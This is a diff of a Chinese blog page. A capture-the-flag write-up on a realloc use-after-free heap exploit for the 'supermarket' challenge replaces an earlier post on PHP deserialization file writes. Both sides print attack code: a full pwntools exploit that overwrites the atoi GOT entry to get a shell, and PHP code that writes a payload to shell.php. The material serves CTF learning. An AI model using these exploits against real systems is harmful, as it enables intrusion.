@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="Pwn," />
 
 
 
@@ -86,18 +86,19 @@
 
 
 
-<meta name="description" content="前言貌似最近的比赛都喜欢出PHP反序列化，赶紧学习一波。 关键函数​     序列化与反序列化函数 12serialize()&#x2F;&#x2F;序列化，将传入的对象转换为字符串unserialize()&#x2F;&#x2F;反序列化，将序列化的字符串还原成对象  魔法函数 123456789__construct()&#x2F;&#x2F;当一个对象创建时被调用__destruct()&#x2F;&#x2F;当一个对象销毁时被调用__toString()&#x2F;&#x2F;当一个对象">
+<meta name="description" content="前言 攻防世界的一道堆题，考察realloc不当导致的uaf~ 前置知识realloc函数1）如果当前内存段后面有需要的内存空间，则直接扩展这段内存空间，realloc()将返回原指针。2）如果当前内存段后面的空闲字节不够，那么就从bins中分配一个满足需求的内存块，将目前的数据复制到新的位置，并将原来的数据块释放掉，返回新的内存块位置。3）如果申请失败，将返回NULL，此时，原来的指针仍然有效。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PHP反序列化学习">
-<meta property="og:url" content="https://www.sketchplane.top/2019/06/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-1/index.html">
+<meta property="og:title" content="攻防世界-supermarket">
+<meta property="og:url" content="https://www.sketchplane.top/2020/11/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-supermarket/index.html">
 <meta property="og:site_name" content="sketch_pl4ne">
-<meta property="og:description" content="前言貌似最近的比赛都喜欢出PHP反序列化，赶紧学习一波。 关键函数​     序列化与反序列化函数 12serialize()&#x2F;&#x2F;序列化，将传入的对象转换为字符串unserialize()&#x2F;&#x2F;反序列化，将序列化的字符串还原成对象  魔法函数 123456789__construct()&#x2F;&#x2F;当一个对象创建时被调用__destruct()&#x2F;&#x2F;当一个对象销毁时被调用__toString()&#x2F;&#x2F;当一个对象">
-<meta property="og:image" content="https://i.loli.net/2019/06/03/5cf4b98c6cd5910069.png">
-<meta property="article:published_time" content="2019-06-03T04:38:51.000Z">
-<meta property="article:modified_time" content="2019-08-26T14:09:04.056Z">
+<meta property="og:description" content="前言 攻防世界的一道堆题，考察realloc不当导致的uaf~ 前置知识realloc函数1）如果当前内存段后面有需要的内存空间，则直接扩展这段内存空间，realloc()将返回原指针。2）如果当前内存段后面的空闲字节不够，那么就从bins中分配一个满足需求的内存块，将目前的数据复制到新的位置，并将原来的数据块释放掉，返回新的内存块位置。3）如果申请失败，将返回NULL，此时，原来的指针仍然有效。">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2020/11/13/ZydFYe.png">
+<meta property="article:published_time" content="2020-11-13T06:48:01.000Z">
+<meta property="article:modified_time" content="2020-11-13T08:08:50.530Z">
 <meta property="article:author" content="sketch_pl4ne">
+<meta property="article:tag" content="Pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2019/06/03/5cf4b98c6cd5910069.png">
+<meta name="twitter:image" content="https://t1.picb.cc/uploads/2020/11/13/ZydFYe.png">
 
 
 
@@ -127,13 +128,13 @@
 
 
 
-  <link rel="canonical" href="https://www.sketchplane.top/2019/06/03/PHP反序列化学习-1/"/>
+  <link rel="canonical" href="https://www.sketchplane.top/2020/11/13/攻防世界-supermarket/"/>
 
 
 
 
 
-  <title>PHP反序列化学习 | sketch_pl4ne</title>
+  <title>攻防世界-supermarket | sketch_pl4ne</title>
   
 
 
@@ -244,7 +245,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.sketchplane.top/2019/06/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-1/">
+    <link itemprop="mainEntityOfPage" href="https://www.sketchplane.top/2020/11/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-supermarket/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sketch_pl4ne">
@@ -261,7 +262,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">PHP反序列化学习</h1>
+          <h1 class="post-title" itemprop="name headline">攻防世界-supermarket</h1>
         
 
         <div class="post-meta">
@@ -273,8 +274,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-03T12:38:51+08:00">
-                2019-06-03
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-13T14:48:01+08:00">
+                2020-11-13
               </time>
             
 
@@ -310,7 +311,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  445
+                  681
                 </span>
               
 
@@ -326,7 +327,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1
+                  2
                 </span>
               
             </div>
@@ -347,30 +348,31 @@
       
 
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>貌似最近的比赛都喜欢出PHP反序列化，赶紧学习一波。</p>
-<h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><p>​    </p>
-<p>序列化与反序列化函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize()<span class="comment">//序列化，将传入的对象转换为字符串</span></span><br><span class="line">unserialize()<span class="comment">//反序列化，将序列化的字符串还原成对象</span></span><br></pre></td></tr></table></figure>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 攻防世界的一道堆题，考察realloc不当导致的uaf~</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="realloc函数"><a href="#realloc函数" class="headerlink" title="realloc函数"></a>realloc函数</h3><p>1）如果当前内存段后面有需要的内存空间，则直接扩展这段内存空间，realloc()将返回原指针。<br><strong>2）如果当前内存段后面的空闲字节不够，那么就从bins中分配一个满足需求的内存块，将目前的数据复制到新的位置，并将原来的数据块释放掉，返回新的内存块位置。</strong><br>3）如果申请失败，将返回NULL，此时，原来的指针仍然有效。</p>
+<h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><ul>
+<li>菜单题，32位，没PIE没canary，栈不可执行</li>
+<li>存在一个长度为0x10的(&amp;s2)数组，是一个结构体指针数组</li>
+<li>chg_des()存在realloc函数，并且没有给返回指针赋值</li>
+<li>结构体的详细内容会用到，见下图：</li>
+</ul>
+<p><img src="https://t1.picb.cc/uploads/2020/11/13/ZydFYe.png" alt=""></p>
+<p><strong>注意：</strong>这里的(&amp;s2)[i]这种写法，是一个结构体指针数组，暂时不确定是否这种写法都是结构体。</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ul>
+<li>创建两个node，第0个大小大于fastbin（0x80），第1个随意</li>
+<li>realloc()第0个node的des，使其free掉，然后申请第2个node，此时<code>node0-&gt;des_ptr = node2</code></li>
+<li>修改node0-&gt;des_ptr，即修改node2，uaf成立</li>
+<li>通过uaf使得des_ptr指向atoi_got地址</li>
+<li>使用list功能泄露atoi()加载地址，使用LibcSearcher求出system()真实地址</li>
+<li>使用chg_des功能修改atoi_got地址的内容为system()真实地址，发送<code>/bin/sh</code>触发漏洞</li>
+</ul>
+<p><strong>注意：</strong>首先，因为realloc()的特点，需要一个node做间隔来防止合并；其次第一个块大小要大于0x80，具体为什么忘记了，之后再看看书= =</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.update(arch='i386', log_level='debug')</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./supermarket'</span>)</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>, <span class="number">42645</span>)</span><br><span class="line">elf = ELF(<span class="string">'./supermarket'</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, size, des)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>, <span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'name:'</span>, str(name))</span><br><span class="line">    io.sendlineafter(<span class="string">'price:'</span>, <span class="string">'10'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'crip_size:'</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">'cription'</span>, des)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chg_des</span><span class="params">(name, size, des)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>, <span class="string">'5'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'name:'</span>, str(name))</span><br><span class="line">    io.sendlineafter(<span class="string">'crip_size:'</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">'cription'</span>, des)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">chg_des(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">''</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x20</span>, <span class="string">'c'</span>*<span class="number">0x10</span>)</span><br><span class="line">payload = <span class="string">b'2'</span>.ljust(<span class="number">16</span>, <span class="string">b'\x00'</span>)+p32(<span class="number">20</span>)+p32(<span class="number">0x20</span>)+p32(atoi_got)</span><br><span class="line">chg_des(<span class="number">0</span>, <span class="number">0x80</span>, payload)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">'2: price.20, des.'</span>)</span><br><span class="line">atoi_addr = u32(io.recvuntil(<span class="string">'\n'</span>, <span class="literal">True</span>).ljust(<span class="number">4</span>, <span class="string">b'\x00'</span>)) <span class="comment"># not necessary</span></span><br><span class="line"><span class="comment">#print(atoi_addr)</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'atoi'</span>, atoi_addr)</span><br><span class="line">libc_base = atoi_addr - libc.dump(<span class="string">'atoi'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">chg_des(<span class="number">2</span>, <span class="number">0x20</span>, p32(system_addr))</span><br><span class="line">io.sendlineafter(<span class="string">'&gt;&gt;'</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>魔法函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct()<span class="comment">//当一个对象创建时被调用</span></span><br><span class="line"></span><br><span class="line">__destruct()<span class="comment">//当一个对象销毁时被调用</span></span><br><span class="line"></span><br><span class="line">__toString()<span class="comment">//当一个对象被当作一个字符串使用</span></span><br><span class="line"></span><br><span class="line">__sleep() <span class="comment">//在对象在被序列化之后调用</span></span><br><span class="line"></span><br><span class="line">__wakeup()<span class="comment">//在字符串反序列化之后调用</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>由于魔术方法不需要调用可以自己执行，当<strong>反序列化的输入参数可控</strong>且未经过滤时，我们可以通过构造特定的序列化字符串，<strong>控制对象内部的变量甚至函数</strong>。</p>
-<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>  __wakeup()或者__destruct()函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">		fwrite($fp, <span class="keyword">$this</span>-&gt;test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$input = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">echo</span> $input;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;	</span><br><span class="line">$input_unser = unserialize($input);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">"shell.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>由代码可知通过输入构造的字符串，把参数$test覆盖掉，即可达到文件写入的目的。</p>
-<p>写一个php脚本获取需要构造的字符串：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">		fwrite($fp, <span class="keyword">$this</span>-&gt;test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$object1 = <span class="keyword">new</span> test1();</span><br><span class="line">$object1-&gt;test = <span class="string">"&lt;?PHP phpinfo(); ?&gt;"</span>;</span><br><span class="line">$object1_ser = serialize($object1);</span><br><span class="line"><span class="keyword">echo</span> $object1_ser;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这里不知道为什么 &lt;?PHP phpinfo();?&gt; 序列化之后打印出来是空，貌似是不能够打印能运行的语句吧。</p>
-<p>得到字符串后传参即可写入shell.php中，为了方便把shell.php包含进来了。</p>
-<p><img src="https://i.loli.net/2019/06/03/5cf4b98c6cd5910069.png" alt="成功之后的结果"></p>
-<p>参考文章：</p>
-<p><a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">最通俗易懂的PHP反序列化原理分析</a>    </p>
-<p><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">浅谈php反序列化漏洞</a></p>
+<p><strong>注意：</strong>这里本地调试有问题，直接远程调。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这题考察的是realloc()导致的uaf，以及如何利用uaf来getshell，atoi()函数需要特别注意，不是第一次遇见改它的got表了。</p>
+<p>下次碰到(&amp;s2)[i]、(%s2)[i] + j，可以想想是不是结构体。</p>
+<p>多刷题，多总结！</p>
 
       
     </div>
@@ -386,6 +388,12 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+          
+        </div>
+      
 
       
       
@@ -395,8 +403,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/13/Python-%E7%88%AC%E5%8F%96%E5%9B%BE%E7%89%87/" rel="next" title="Python-爬取图片">
-                <i class="fa fa-chevron-left"></i> Python-爬取图片
+              <a href="/2020/10/25/IDEA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/" rel="next" title="IDEA加密算法">
+                <i class="fa fa-chevron-left"></i> IDEA加密算法
               </a>
             
           </div>
@@ -405,8 +413,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/06/05/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/" rel="prev" title="Hash长度拓展攻击">
-                Hash长度拓展攻击 <i class="fa fa-chevron-right"></i>
+              <a href="/2099/12/31/sketch-pl4ne%E3%81%AE%E6%97%A5%E8%AE%B0/" rel="prev" title="sketch_pl4neのdiary">
+                sketch_pl4neのdiary <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -560,7 +568,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关键函数"><span class="nav-number">2.</span> <span class="nav-text">关键函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方法"><span class="nav-number">3.</span> <span class="nav-text">利用方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用场景"><span class="nav-number">4.</span> <span class="nav-text">利用场景</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#前置知识"><span class="nav-number">2.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#realloc函数"><span class="nav-number">2.1.</span> <span class="nav-text">realloc函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目信息"><span class="nav-number">3.</span> <span class="nav-text">题目信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用思路"><span class="nav-number">4.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">5.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li></ol></div>
             
 
           </div>
